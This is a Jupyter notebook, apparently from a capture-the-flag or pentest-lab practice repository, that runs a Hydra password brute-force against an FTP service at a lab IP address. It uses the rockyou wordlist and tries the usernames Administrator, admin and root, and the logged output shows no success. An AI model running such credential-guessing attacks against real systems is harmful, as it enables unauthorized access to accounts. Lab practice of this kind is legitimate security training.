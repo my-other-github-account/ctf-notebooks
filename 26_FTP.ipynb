{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "b594c56a-5485-46e7-8066-910a24e46bd7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TARGET=10.11.1.30\n"
     ]
    }
   ],
   "source": [
    "target = open('00_target.txt').read()\n",
    "%env TARGET={target}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "9d5f4848-7873-4e24-bf9d-8449a973cd22",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: PL=/home/parallels/hax/SecLists/Passwords/probable-v2-top1575.txt\n",
      "env: PLRY=/usr/share/wordlists/rockyou.txt\n"
     ]
    }
   ],
   "source": [
    "%env PL=/home/parallels/hax/SecLists/Passwords/probable-v2-top1575.txt\n",
    "%env PLRY=/usr/share/wordlists/rockyou.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "4101513a-de8f-47d0-9283-42eac2d055f4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting custom_users.txt\n"
     ]
    }
   ],
   "source": [
    "%%writefile custom_users.txt\n",
    "Administrator\n",
    "admin\n",
    "root"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "10b1ab6c-e8d1-4690-b2e1-96270ffb4352",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-14 18:25:04\n",
      "[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task\n",
      "[DATA] attacking ftp://10.11.1.30:21/\n",
      "[STATUS] 256.00 tries/min, 256 tries in 00:01h, 43032941 to do in 2801:38h, 16 active\n",
      "[STATUS] 250.67 tries/min, 752 tries in 00:03h, 43032445 to do in 2861:12h, 16 active\n",
      "[STATUS] 262.00 tries/min, 1834 tries in 00:07h, 43031363 to do in 2737:22h, 16 active\n",
      "[STATUS] 263.13 tries/min, 3947 tries in 00:15h, 43029250 to do in 2725:27h, 16 active\n",
      "[STATUS] 218.69 tries/min, 6823 tries in 00:31h, 43026374 to do in 3279:10h, 16 active\n",
      "[STATUS] 86.68 tries/min, 6842 tries in 01:18h, 43026363 to do in 8272:58h, 16 active\n",
      "[STATUS] 52.12 tries/min, 6842 tries in 02:11h, 43026363 to do in 13759:44h, 16 active\n",
      "[STATUS] 28.44 tries/min, 6842 tries in 04:00h, 43026363 to do in 25215:24h, 16 active\n",
      "[STATUS] 22.62 tries/min, 6842 tries in 05:02h, 43026363 to do in 31708:21h, 16 active\n",
      "[STATUS] 19.56 tries/min, 6842 tries in 05:49h, 43026363 to do in 36665:50h, 16 active\n",
      "[STATUS] 12.24 tries/min, 6842 tries in 09:19h, 43026363 to do in 58598:57h, 16 active\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -L custom_users.txt -u -P $PLRY $TARGET ftp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6f9623e3-b666-4e5a-94a7-0b61d553bb7b",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
